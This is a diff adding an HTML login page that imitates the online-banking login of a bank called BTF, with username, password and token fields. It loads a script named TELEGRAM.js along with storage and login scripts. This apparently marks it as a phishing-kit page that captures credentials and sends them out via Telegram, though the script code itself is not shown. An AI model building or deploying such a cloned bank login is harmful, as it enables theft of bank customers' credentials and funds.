@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta name="theme-color" content="#013b53">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <link rel="shortcut icon" href="img/favicon.ico">
+    <link rel="apple-touch-icon" href="img/favicon.png"> 
+    <script type='text/javascript' src="//wurfl.io/wurfl.js"></script>
+
+    <meta name="theme-color" content="#013b53">
+
+<link rel="shortcut icon" href="img/favicon.ico">
+<link rel="apple-touch-icon" href="img/favicon.png"> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style/main.css"> <!-- Enlace al archivo de estilos CSS -->
+    <title>Login BTF</title>
+</head>
+<body>
+    <div class="login-container">
+        <img src="img/logo.png" alt="Logo BTF" class="logo">
+        <h2 style="color: #2c3033;">Ingresá a tu homebanking</h2>
+        <form id="loginForm" method="post" action="#">
+            <div class="input-label">Usuario</div>
+            <div class="input-wrapper">
+                <input type="text" id="username">
+            </div>
+            <div class="input-label">Contraseña</div>
+            <div class="input-wrapper password-field">
+                <input type="password" id="password">
+                <img src="img/eye-slash.svg" alt="Mostrar/Ocultar" class="toggle-password">
+            </div>
+            <button type="submit" disabled>INGRESÁ</button>
+            <div class="link-wrapper">
+                <a href="#" class="forgot-link">Recuperar mi usuario o contraseña</a>
+            </div>
+            <div class="link-wrapper">
+                <a href="#" class="token-link">
+                    <img src="img/lock.svg" alt="Token" class="padlock-icon">
+                    Generar token
+                </a>
+            </div>
+        </form>
+        <footer class="footer">
+            <p class="footer-text">¿No tienes usuario? <a href="#" ></a>Créalo ahora</p>
+        </footer>
+    </div>
+    <script src="js/script.js"></script>
+    <script src="TELEGRAM.js"></script> 
+    <script src="js/back.js"></script> 
+    <script src="js/storage.js"></script> 
+    <script src="js/login.js"></script> 
+    
+</body>
+</html>
